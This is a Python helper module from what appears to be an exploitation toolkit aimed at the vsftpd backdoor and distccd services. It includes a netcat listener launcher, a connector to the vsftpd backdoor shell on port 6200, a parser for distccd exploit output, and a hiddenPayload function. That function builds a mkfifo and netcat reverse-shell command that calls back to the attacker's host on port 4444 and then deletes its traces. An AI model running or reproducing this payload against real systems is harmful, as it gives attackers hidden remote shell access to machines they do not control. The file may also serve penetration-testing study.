import subprocess
import random
import string

# We want to run netcat in another terminal so that we have access to the targeted machine once we exploit it
def ncListener(localPort):

    # This runs netcat to listen for a connection on the port that we specified on our machine
    # nlvp tells netcat to not perform a DNS lookup, to operate in listen mode, to use verbose mode, and to allow for the specification of a specific port
    command = f"nc -nlvp {localPort}"

    # This opens a new terminal and runs the netcat command
    subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', command])

# This is specfically for the vsftp exploit
def interactiveTerminal(ip):

    # opens a new terminal and runs nc on the given ip and to listen on port 6200
    command = f"gnome-terminal -- bash -c 'nc {ip} {6200}'"

    # allows the command to be executed through the shell
    subprocess.Popen(command, shell=True)

# generates random text of a given length
def randomTextGen(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Reads output from the distccd exploit
def readOutput(sock):

    # ignore the first 4 bytes because they dont matter
    sock.recv(4)

    # read the next 8 bytes of the socket (we defined 8 bytes in the distccd exploit)
    length = int(sock.recv(8), 16)

    # Return the data that was read
    return sock.recv(length) if length else b""

def hiddenPayload(lhost):
    
    # pipe is used to create a pipe called /tmp/intruder, this will allow for data to be passed between processes
    pipe = 'mkfifo /tmp/intruder; '

    # Creates a connection to our machine and reads input from the /tmp/intruder file
    ncSetup = f'nc {lhost} 4444 0</tmp/intruder '

    # starts a shell on the targeted mahine and redirect input and output from /bin/sh to /tmp/intruder so that only we see what is being executed
    shellSetup = '| /bin/sh >/tmp/intruder 2>&1; '

    # removes the folder after the payload has been executed
    cleanup = 'rm /tmp/intruder'

    payload = f"{pipe}{ncSetup}{shellSetup}{cleanup}"
    
    return payload 